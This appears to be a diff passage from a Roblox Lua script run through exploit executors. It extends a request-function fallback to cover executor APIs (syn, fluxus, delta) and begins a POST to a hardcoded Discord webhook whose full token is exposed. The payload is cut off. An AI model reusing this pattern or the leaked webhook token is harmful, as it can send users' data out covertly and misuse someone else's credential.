@@ -1,7 +1,7 @@
 HttpService = game:GetService("HttpService") 
  Webhook_URL =  "https://discord.com/api/webhooks/1165548495424462928/M5Qru9Sza9QK75S2Ssj9xbF8o5do9Ski-BtKXw2R51Yn6iOS6LgrDcm0TndFDcorCN2P" 
- local ok = request or http_request or (http and http.request) or syn.request 
- ok( 
+ local httprequest = request or http_request or (http and http.request) or (fluxus.request and fluxus) or syn.request or (delta.request and delta)
+httprequest(
  { 
  Url = Webhook_URL, 
  Method = 'POST', 
